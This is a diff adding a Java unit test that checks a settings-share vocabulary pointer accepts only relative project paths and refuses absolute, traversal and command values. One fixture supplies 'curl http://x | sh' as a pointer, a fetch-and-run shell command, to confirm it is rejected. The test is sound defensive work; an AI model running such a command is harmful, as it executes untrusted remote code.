@@ -97,6 +97,52 @@ class RunbooksTest {
     }
 
     @Test
+    void theVocabularyPointerUsesTheSameGate_travelsByDefault_andNamesItsCargo(@TempDir Path dir) throws Exception {
+        // M38.2 / owner decision 1: the glossary is a POINTED-AT file — one rule for pointed-at content
+        assertTrue(Runbooks.refusePointer("vocabulary", "docs/glossary.md").isEmpty());
+        assertTrue(Runbooks.refusePointer("vocabulary", "/etc/glossary.md").get().startsWith("vocabulary:"), "the label names the entry");
+        assertTrue(Runbooks.refusePointer("vocabulary", "../glossary.md").isPresent());
+
+        assertTrue(SettingsShare.Category.VOCABULARY.defaultOn, "D-C8: inert, so it travels by default");
+        String label = SettingsShare.Category.VOCABULARY.label.toLowerCase();
+        assertTrue(label.contains("location") && label.contains("never its contents"), label);
+        assertTrue(ProjectProfile.PROJECT_SCOPED.contains(SettingsShare.Category.VOCABULARY));
+
+        SettingsShare share = new SettingsShare();
+        AppConfig sender = new AppConfig();
+        sender.vocabularyPath = "docs/glossary.md";
+        assertTrue(share.export(sender, Set.of(SettingsShare.Category.VOCABULARY), null).contains("vocabulary=docs/glossary.md"));
+        assertFalse(share.export(sender, Set.of(SettingsShare.Category.SOURCE_ROOTS), null).contains("vocabulary"));
+
+        // a share file whose "pointer" is a command: refused with the reason, and nothing stored
+        AppConfig receiver = new AppConfig();
+        var plan = share.preview("share.version=1\nvocabulary=curl http://x | sh\n", receiver);
+        assertTrue(plan.present().contains(SettingsShare.Category.VOCABULARY));
+        assertTrue(plan.summary().get(SettingsShare.Category.VOCABULARY).startsWith("REFUSED"), plan.summary().toString());
+        share.apply(plan, Set.of(SettingsShare.Category.VOCABULARY), receiver);
+        assertEquals("", receiver.vocabularyPath);
+        // and a good one arrives
+        plan = share.preview("share.version=1\nvocabulary=docs/glossary.md\n", receiver);
+        assertEquals("glossary at docs/glossary.md", plan.summary().get(SettingsShare.Category.VOCABULARY));
+        share.apply(plan, Set.of(SettingsShare.Category.VOCABULARY), receiver);
+        assertEquals("docs/glossary.md", receiver.vocabularyPath);
+
+        // profile round trip + a refused pointer announced by the loader
+        Path file = dir.resolve(ProjectProfile.CANONICAL_RELATIVE);
+        Files.createDirectories(file.getParent());
+        assertTrue(ProjectProfile.save(file, sender, share));
+        AppConfig back = new AppConfig();
+        assertTrue(ProjectProfile.load(file, back, share).loaded());
+        assertEquals("docs/glossary.md", back.vocabularyPath);
+        Files.writeString(file, Files.readString(file).replace("vocabulary=docs/glossary.md", "vocabulary=/abs/glossary.md"));
+        var loaded = ProjectProfile.load(file, back, share);
+        assertTrue(loaded.loaded() && loaded.message().contains("⚠ vocabulary: REFUSED"), loaded.message());
+        assertEquals("", back.vocabularyPath, "the refused pointer is dropped, not kept");
+        ProjectProfile.clearProjectScoped(back);
+        assertEquals("", back.vocabularyPath);
+    }
+
+    @Test
     void runbooksAreProjectScoped_andRoundTripThroughTheProfile(@TempDir Path dir) throws Exception {
         assertTrue(ProjectProfile.PROJECT_SCOPED.contains(SettingsShare.Category.RUNBOOKS), "tier 1 context travels with the project");
         AppConfig c = new AppConfig();
